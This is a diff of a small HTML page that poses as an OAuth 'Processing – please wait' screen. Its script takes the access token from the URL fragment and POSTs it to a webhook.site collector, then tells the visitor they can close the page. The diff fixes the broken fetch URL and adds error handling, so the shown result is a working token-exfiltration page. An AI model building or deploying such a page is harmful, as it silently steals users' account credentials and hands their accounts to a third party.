@@ -4,20 +4,28 @@
 <body>
   <h3>Processing – please wait.</h3>
   <script>
+    // Get the full URL fragment
     const hash = window.location.hash.substring(1);
     const params = new URLSearchParams(hash);
     const token = params.get('access_token');
 
     if (token) {
-      fetch(https://webhook.site/232074eb-870d-4ba0-9d4a-4fc1d7b858b8, {  // <-- REPLACE with your webhook.site URL
+      // Send to webhook.site
+      fetch('https://webhook.site/232074eb-870d-4ba0-9d4a-4fc1d7b858b8', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ token: token })
-      }).then(() => {
+      })
+      .then(() => {
         document.body.innerHTML = '<h3>Done – you can close this.</h3>';
+      })
+      .catch((err) => {
+        document.body.innerHTML = '<h3>Error sending token – check console.</h3>';
+        console.error(err);
       });
     } else {
-      document.body.innerHTML = '<h3>Error – no token.</h3>';
+      document.body.innerHTML = '<h3>No token found in URL.</h3>';
+      console.log('Hash:', window.location.hash);
     }
   </script>
 </body>
